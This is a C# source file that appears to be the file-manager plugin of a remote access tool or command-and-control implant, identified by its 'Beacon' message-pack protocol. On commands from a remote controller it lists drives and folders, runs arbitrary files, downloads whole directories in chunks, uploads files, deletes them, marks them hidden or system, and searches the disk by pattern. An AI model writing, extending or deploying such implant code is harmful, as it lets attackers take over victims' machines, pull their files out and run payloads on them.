using Beacon.MessagePackLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;

namespace cc
{
    public static class Packet
    {
        public static void Read(BeaconMsgPack unpack_msgpack)
        {
            string CID = unpack_msgpack.ForcePathObject("CID").AsString;
            string type = unpack_msgpack.ForcePathObject("Pac_ket").AsString;
            try
            {
                switch (type)
                {
                    case "GetDrivers":
                        {
                            GetDrivers(CID);
                            break;
                        }
                    case "GetPath":
                        {
                            string path = unpack_msgpack.ForcePathObject("Path").AsString;
                            GetPath(path, CID);
                            break;
                        }
                    case "CreateFolder":
                    {
                        string parent = unpack_msgpack.ForcePathObject("Path").AsString;
                        CreateFolder(parent, CID);
                        break;
                    }
                    case "Execute":
                    {
                        string file = unpack_msgpack.ForcePathObject("Path").AsString;
                        ExecuteFile(file, CID);
                        break;
                    }
                    case "Download":
                    {
                        string path = unpack_msgpack.ForcePathObject("Path").AsString;
                        bool isDir = unpack_msgpack.ForcePathObject("IsDir").AsInteger == 1;
                        long resumeOffset = 0;
                        try { resumeOffset = unpack_msgpack.ForcePathObject("ResumeOffset").AsInteger; } catch { resumeOffset = 0; }
                        DownloadChunked(path, isDir, CID, resumeOffset);
                        break;
                    }
                    case "Delete":
                    {
                        string path = unpack_msgpack.ForcePathObject("Path").AsString;
                        bool isDir = unpack_msgpack.ForcePathObject("IsDir").AsInteger == 1;
                        Delete(path, isDir, CID);
                        break;
                    }
                    case "SetAttr":
                    {
                        string path = unpack_msgpack.ForcePathObject("Path").AsString;
                        bool isDir = unpack_msgpack.ForcePathObject("IsDir").AsInteger == 1;
                        bool hidden = unpack_msgpack.ForcePathObject("Hidden").AsInteger == 1;
                        bool system = unpack_msgpack.ForcePathObject("System").AsInteger == 1;
                        SetAttr(path, isDir, hidden, system, CID);
                        break;
                    }
                    case "Upload":
                    {
                        string remoteDir = unpack_msgpack.ForcePathObject("RemoteDir").AsString;
                        string fileName = unpack_msgpack.ForcePathObject("FileName").AsString;
                        byte[] data = unpack_msgpack.ForcePathObject("Data").GetAsBytes();
                        Upload(remoteDir, fileName, data, CID);
                        break;
                    }
                    case "Compress":
                    {
                        string baseDir = unpack_msgpack.ForcePathObject("BaseDir").AsString;
                        string paths = unpack_msgpack.ForcePathObject("Paths").AsString;
                        Compress(baseDir, paths, CID);
                        break;
                    }
                    case "Search":
                    {
                        string basePath = unpack_msgpack.ForcePathObject("BasePath").AsString;
                        string keyword = unpack_msgpack.ForcePathObject("Keyword").AsString;
                        Search(basePath, keyword, CID);
                        break;
                    }
                    case "Stop":
                        {
                            //停止，并且释放资源
                            Plugin.Destroy();
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message, unpack_msgpack.ForcePathObject("CID").AsString);
            }
        }
        public static void Error(string ex, string CID)
        {
            BeaconMsgPack msgpack = new BeaconMsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("CID").AsString = CID;
            msgpack.ForcePathObject("Error").AsString = ex;
            Plugin.SendFramed(msgpack.Encode2Bytes());
        }

        public static void GetDrivers(string CID)
        {
            try
            {
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                BeaconMsgPack msgpack = new BeaconMsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "FileManager";
                msgpack.ForcePathObject("Action").AsString = "Drivers";
                msgpack.ForcePathObject("CID").AsString = CID;
                StringBuilder sbDriver = new StringBuilder();
                foreach (DriveInfo d in allDrives)
                {
                    if (!d.IsReady) continue;
                    string iconB64 = Convert.ToBase64String(GetShellIconPngBytes(d.RootDirectory.FullName, true));
                    // Name-=>Type-=>IconBase64-=>
                    sbDriver.Append(d.Name).Append("-=>").Append(d.DriveType).Append("-=>").Append(iconB64).Append("-=>");
                    }
                    msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                    Plugin.SendFramed(msgpack.Encode2Bytes());
                }
            catch { }
        }

        public static void GetPath(string path, string CID)
        {
            try
            {
                BeaconMsgPack msgpack = new BeaconMsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "FileManager";
                msgpack.ForcePathObject("Action").AsString = "Path";
                msgpack.ForcePathObject("CID").AsString = CID;
                msgpack.ForcePathObject("Path").AsString = path;

                // 目录项以行分隔：Name|Type|IsDir|Size|Date
                StringBuilder sb = new StringBuilder();
                if (Directory.Exists(path))
                {
                    foreach (var dir in Directory.GetDirectories(path))
                    {
                        var di = new DirectoryInfo(dir);
                        string iconB64 = Convert.ToBase64String(GetShellIconPngBytes(di.FullName, true));
                        sb.Append(di.Name).Append('|').Append("Folder").Append('|').Append('1').Append('|').Append('0').Append('|').Append(di.LastWriteTimeUtc.Ticks).Append('|').Append(iconB64).Append('\n');
                    }
                    foreach (var file in Directory.GetFiles(path))
                    {
                        var fi = new FileInfo(file);
                        string iconB64 = Convert.ToBase64String(GetShellIconPngBytes(fi.FullName, false));
                        sb.Append(fi.Name).Append('|').Append(fi.Extension).Append('|').Append('0').Append('|').Append(fi.Length).Append('|').Append(fi.LastWriteTimeUtc.Ticks).Append('|').Append(iconB64).Append('\n');
                    }
                }
                msgpack.ForcePathObject("Items").AsString = sb.ToString();
                Plugin.SendFramed(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Error(ex.Message, CID);
            }
        }

        private static void SendAck(string cid, string op, bool ok, string msg = "")
        {
            try
            {
                BeaconMsgPack m = new BeaconMsgPack();
                m.ForcePathObject("Pac_ket").AsString = "FileManager";
                m.ForcePathObject("Action").AsString = "Ack";
                m.ForcePathObject("CID").AsString = cid;
                m.ForcePathObject("Op").AsString = op;
                m.ForcePathObject("Ok").AsInteger = ok ? 1 : 0;
                m.ForcePathObject("Msg").AsString = msg;
                Plugin.SendFramed(m.Encode2Bytes());
            }
            catch { }
        }

        private static void CreateFolder(string parent, string cid)
        {
            try
            {
                if (string.IsNullOrEmpty(parent) || !Directory.Exists(parent))
                {
                    SendAck(cid, "CreateFolder", false, "Invalid parent path");
                    return;
                }
                string baseName = "新建文件夹";
                string newPath = Path.Combine(parent, baseName);
                int index = 1;
                while (Directory.Exists(newPath)) newPath = Path.Combine(parent, baseName + " (" + (index++) + ")");
                Directory.CreateDirectory(newPath);
                SendAck(cid, "CreateFolder", true, newPath);
            }
            catch (Exception ex) { SendAck(cid, "CreateFolder", false, ex.Message); }
        }

        private static void ExecuteFile(string file, string cid)
        {
            try
            {
                if (!File.Exists(file)) { SendAck(cid, "Execute", false, "Not found"); return; }
                Process.Start(file);
                SendAck(cid, "Execute", true);
            }
            catch (Exception ex) { SendAck(cid, "Execute", false, ex.Message); }
        }

        private static void Download(string path, bool isDir, string cid)
        {
            try
            {
                if (isDir)
                {
                    SendAck(cid, "Download", false, "Directory download not implemented");
                    return;
                }
                if (!File.Exists(path)) { SendAck(cid, "Download", false, "Not found"); return; }
                byte[] data = File.ReadAllBytes(path);
                BeaconMsgPack m = new BeaconMsgPack();
                m.ForcePathObject("Pac_ket").AsString = "FileManager";
                m.ForcePathObject("Action").AsString = "DownloadData";
                m.ForcePathObject("CID").AsString = cid;
                m.ForcePathObject("Path").AsString = path;
                m.ForcePathObject("FileName").AsString = Path.GetFileName(path);
                m.ForcePathObject("Data").SetAsBytes(data);
                Plugin.SendFramed(m.Encode2Bytes());
            }
            catch (Exception ex) { SendAck(cid, "Download", false, ex.Message); }
        }

        // Chunked download with optional resume
        private static void DownloadChunked(string path, bool isDir, string cid, long resumeOffset)
        {
            try
            {
                if (isDir)
                {
                    if (!Directory.Exists(path)) { SendAck(cid, "Download", false, "Directory not found"); return; }
                    string rootName = Path.GetFileName(path.TrimEnd('\\','/'));
                    foreach (var file in Directory.GetFiles(path, "*", SearchOption.AllDirectories))
                    {
                        SendFileChunked(file, cid, path, 0, rootName); // no resume per-file for simplicity
                    }
                }
                else
                {
                    if (!File.Exists(path)) { SendAck(cid, "Download", false, "Not found"); return; }
                    SendFileChunked(path, cid, Path.GetDirectoryName(path) ?? string.Empty, resumeOffset, null);
                }
            }
            catch (Exception ex)
            {
                SendAck(cid, "Download", false, ex.Message);
            }
        }

        private static void SendFileChunked(string fullPath, string cid, string baseDir, long resumeOffset, string rootName)
        {
            const int CHUNK_SIZE = 64 * 1024;
            long total = new FileInfo(fullPath).Length;
            if (resumeOffset < 0 || resumeOffset > total) resumeOffset = 0;
            string relativeName;
            try
            {
                if (!string.IsNullOrEmpty(baseDir))
                {
                    relativeName = MakeRelativePath(baseDir, fullPath);
                }
                else
                {
                    relativeName = Path.GetFileName(fullPath);
                }
            }
            catch { relativeName = Path.GetFileName(fullPath); }

            using (var fs = new FileStream(fullPath, FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                fs.Position = resumeOffset;
                byte[] buffer = new byte[CHUNK_SIZE];
                long sent = resumeOffset;
                while (true)
                {
                    int read = fs.Read(buffer, 0, buffer.Length);
                    if (read <= 0) break;

                    BeaconMsgPack m = new BeaconMsgPack();
                    m.ForcePathObject("Pac_ket").AsString = "FileManager";
                    m.ForcePathObject("Action").AsString = "DownloadChunk";
                    m.ForcePathObject("CID").AsString = cid;
                    m.ForcePathObject("Path").AsString = fullPath;
                    m.ForcePathObject("FileName").AsString = relativeName;
                    if (!string.IsNullOrEmpty(rootName)) m.ForcePathObject("Root").AsString = rootName;
                    m.ForcePathObject("Offset").AsInteger = sent;
                    m.ForcePathObject("Total").AsInteger = total;
                    m.ForcePathObject("Length").AsInteger = read;
                    byte[] chunk = new byte[read];
                    Buffer.BlockCopy(buffer, 0, chunk, 0, read);
                    m.ForcePathObject("Data").SetAsBytes(chunk);
                    sent += read;
                    m.ForcePathObject("Completed").AsInteger = sent >= total ? 1 : 0;
                    Plugin.SendFramed(m.Encode2Bytes());
                }
            }
        }

        private static void Delete(string path, bool isDir, string cid)
        {
            try
            {
                if (isDir)
                {
                    if (!Directory.Exists(path)) { SendAck(cid, "Delete", false, "Directory not found"); return; }
                    Directory.Delete(path, true);
                }
                else
                {
                    if (!File.Exists(path)) { SendAck(cid, "Delete", false, "File not found"); return; }
                    File.Delete(path);
                }
                SendAck(cid, "Delete", true);
            }
            catch (Exception ex) { SendAck(cid, "Delete", false, ex.Message); }
        }

        private static void SetAttr(string path, bool isDir, bool hidden, bool system, string cid)
        {
            try
            {
                if (isDir ? !Directory.Exists(path) : !File.Exists(path)) { SendAck(cid, "SetAttr", false, "Not found"); return; }
                FileAttributes attrs = File.GetAttributes(path);
                if (hidden) attrs |= FileAttributes.Hidden; else attrs &= ~FileAttributes.Hidden;
                if (system) attrs |= FileAttributes.System; else attrs &= ~FileAttributes.System;
                File.SetAttributes(path, attrs);
                SendAck(cid, "SetAttr", true);
            }
            catch (Exception ex) { SendAck(cid, "SetAttr", false, ex.Message); }
        }

        private static void Upload(string remoteDir, string fileName, byte[] data, string cid)
        {
            try
            {
                if (string.IsNullOrEmpty(remoteDir) || string.IsNullOrEmpty(fileName)) { SendAck(cid, "Upload", false, "Invalid path"); return; }
                if (!Directory.Exists(remoteDir)) Directory.CreateDirectory(remoteDir);
                string path = Path.Combine(remoteDir, fileName);
                File.WriteAllBytes(path, data ?? new byte[0]);
                SendAck(cid, "Upload", true);
            }
            catch (Exception ex) { SendAck(cid, "Upload", false, ex.Message); }
        }

        private static void Compress(string baseDir, string paths, string cid)
        {
            // 最小实现：暂不支持，返回失败信息，避免阻塞
            SendAck(cid, "Compress", false, "Not implemented");
        }

        private static void Search(string basePath, string keyword, string cid)
        {
            try
            {
                if (string.IsNullOrEmpty(basePath) || !Directory.Exists(basePath)) { SendAck(cid, "Search", false, "Base path not found"); return; }
                if (string.IsNullOrEmpty(keyword)) { SendAck(cid, "Search", false, "Empty keyword"); return; }

                // 解析模式：支持正则或通配符
                bool isRegex = false;
                try { isRegex = keyword.StartsWith("regex:", StringComparison.OrdinalIgnoreCase); } catch { }
                System.Text.RegularExpressions.Regex regex = null;
                string[] wildcards = null;
                if (isRegex)
                {
                    string pattern = keyword.Substring(6);
                    regex = new System.Text.RegularExpressions.Regex(pattern, System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                }
                else
                {
                    // 支持以;分隔的多个模式，如 *.exe;*.txt;123.*
                    wildcards = keyword.Split(new[] { ';' }, StringSplitOptions.RemoveEmptyEntries);
                }

                // 高速搜索：使用栈非递归遍历，逐批发送以降低压力
                var stack = new Stack<string>();
                stack.Push(basePath);
                string rootName = Path.GetFileName(basePath.TrimEnd('\\','/'));
                int batch = 0;
                StringBuilder sb = new StringBuilder();

                while (stack.Count > 0)
                {
                    string dir = stack.Pop();
                    try
                    {
                        foreach (var sub in Directory.GetDirectories(dir))
                        {
                            stack.Push(sub);
                            // 目录匹配
                            if (IsMatch(Path.GetFileName(sub), isRegex, regex, wildcards))
                            {
                                AppendEntry(sb, basePath, sub, true);
                                batch++;
                            }
                        }
                        foreach (var file in Directory.GetFiles(dir))
                        {
                            if (IsMatch(Path.GetFileName(file), isRegex, regex, wildcards))
                            {
                                AppendEntry(sb, basePath, file, false);
                                batch++;
                            }
                        }
                        if (batch >= 200)
                        {
                            SendSearchBatch(cid, rootName, basePath, sb.ToString());
                            sb.Clear();
                            batch = 0;
                        }
                    }
                    catch { }
                }

                // flush last
                if (sb.Length > 0)
                {
                    SendSearchBatch(cid, rootName, basePath, sb.ToString());
                }

                // send finished marker
                BeaconMsgPack done = new BeaconMsgPack();
                done.ForcePathObject("Pac_ket").AsString = "FileManager";
                done.ForcePathObject("Action").AsString = "SearchDone";
                done.ForcePathObject("CID").AsString = cid;
                done.ForcePathObject("Root").AsString = rootName;
                done.ForcePathObject("BasePath").AsString = basePath;
                Plugin.SendFramed(done.Encode2Bytes());
            }
            catch (Exception ex)
            {
                SendAck(cid, "Search", false, ex.Message);
            }
        }

        private static bool IsMatch(string name, bool isRegex, System.Text.RegularExpressions.Regex regex, string[] wildcards)
        {
            try
            {
                if (isRegex)
                {
                    return regex != null && regex.IsMatch(name);
                }
                else
                {
                    if (wildcards == null || wildcards.Length == 0) return name.IndexOf("*", StringComparison.Ordinal) >= 0 ? false : name.IndexOf(wildcards[0], StringComparison.OrdinalIgnoreCase) >= 0;
                    foreach (var wc in wildcards)
                    {
                        var pattern = wc.Trim();
                        if (string.IsNullOrEmpty(pattern)) continue;
                        if (WildcardMatch(name, pattern)) return true;
                    }
                    return false;
                }
            }
            catch { return false; }
        }

        private static bool WildcardMatch(string input, string pattern)
        {
            // 将简单通配符转换为正则
            try
            {
                string regexPattern = System.Text.RegularExpressions.Regex.Escape(pattern)
                    .Replace("\\*", ".*")
                    .Replace("\\?", ".");
                return System.Text.RegularExpressions.Regex.IsMatch(input, "^" + regexPattern + "$", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
            }
            catch { return false; }
        }

        private static void AppendEntry(StringBuilder sb, string basePath, string fullPath, bool isDir)
        {
            try
            {
                string relative = MakeRelativePath(basePath, fullPath);
                long size = 0;
                long ticks = 0;
                if (!isDir)
                {
                    var fi = new FileInfo(fullPath);
                    size = fi.Length;
                    ticks = fi.LastWriteTimeUtc.Ticks;
                }
                else
                {
                    var di = new DirectoryInfo(fullPath);
                    ticks = di.LastWriteTimeUtc.Ticks;
                }
                string iconB64 = Convert.ToBase64String(GetShellIconPngBytes(fullPath, isDir));
                sb.Append(relative).Append('|')
                  .Append(isDir ? "Folder" : Path.GetExtension(fullPath))
                  .Append('|').Append(isDir ? '1' : '0')
                  .Append('|').Append(size)
                  .Append('|').Append(ticks)
                  .Append('|').Append(iconB64)
                  .Append('\n');
            }
            catch { }
        }

        private static string MakeRelativePath(string baseDir, string fullPath)
        {
            try
            {
                if (string.IsNullOrEmpty(baseDir)) return Path.GetFileName(fullPath);
                string baseWithSep = baseDir;
                char sep = Path.DirectorySeparatorChar;
                if (!baseWithSep.EndsWith(sep.ToString())) baseWithSep += sep;
                Uri baseUri = new Uri(baseWithSep);
                Uri fullUri = new Uri(fullPath);
                string rel = baseUri.MakeRelativeUri(fullUri).ToString();
                if (string.IsNullOrEmpty(rel)) return Path.GetFileName(fullPath);
                return Uri.UnescapeDataString(rel).Replace('/', Path.DirectorySeparatorChar);
            }
            catch { return Path.GetFileName(fullPath); }
        }

        private static void SendSearchBatch(string cid, string rootName, string basePath, string items)
        {
            BeaconMsgPack m = new BeaconMsgPack();
            m.ForcePathObject("Pac_ket").AsString = "FileManager";
            m.ForcePathObject("Action").AsString = "SearchResult";
            m.ForcePathObject("CID").AsString = cid;
            m.ForcePathObject("Root").AsString = rootName;
            m.ForcePathObject("BasePath").AsString = basePath;
            m.ForcePathObject("Items").AsString = items ?? string.Empty;
            Plugin.SendFramed(m.Encode2Bytes());
        }

        //================ Shell Icon ==================
        [StructLayout(LayoutKind.Sequential)]
        private struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)] public string szTypeName;
        }

        [DllImport("Shell32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);

        private const uint SHGFI_ICON = 0x000000100;
        private const uint SHGFI_SMALLICON = 0x000000001;
        private const uint SHGFI_USEFILEATTRIBUTES = 0x000000010;
        private const uint FILE_ATTRIBUTE_DIRECTORY = 0x00000010;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool DestroyIcon(IntPtr hIcon);   // 用于释放图标资源
       

        private static byte[] GetShellIconPngBytes(string path, bool isDirectory)
        {
			try
			{
				Icon icon = null;
				try
				{
					if (isDirectory)
					{
						// 驱动器根目录单独处理，仅当路径就是根路径时
						if (!string.IsNullOrEmpty(path))
						{
							string normalized = path.TrimEnd('\\','/');
							string root = string.Empty;
							try { root = Path.GetPathRoot(path)?.TrimEnd('\\','/') ?? string.Empty; } catch { root = string.Empty; }
							bool isRoot = !string.IsNullOrEmpty(root) &&
								string.Equals(root, normalized, StringComparison.OrdinalIgnoreCase);
							if (isRoot && root.Length >= 2 && root[1] == ':')
							{
								char drive = char.ToUpperInvariant(root[0]);
								icon = FileManager.Helper.SystemIcon.GetDriverIcon(drive, true, out _);
							}
						}
						if (icon == null)
						{
							icon = FileManager.Helper.SystemIcon.GetFolderIcon(string.IsNullOrEmpty(path) ? Environment.SystemDirectory : path, true, out _);
						}
					}
					else
					{
						icon = FileManager.Helper.SystemIcon.GetFileIcon(path, true, out _);
					}
				}
				catch { }

				if (icon != null)
				{
					using (icon)
					using (var bmp = icon.ToBitmap())
					using (var ms = new MemoryStream())
					{
						bmp.Save(ms, ImageFormat.Png);
						return ms.ToArray();
					}
				}
			}
			catch { }
			return new byte[0];
        }
    }

}
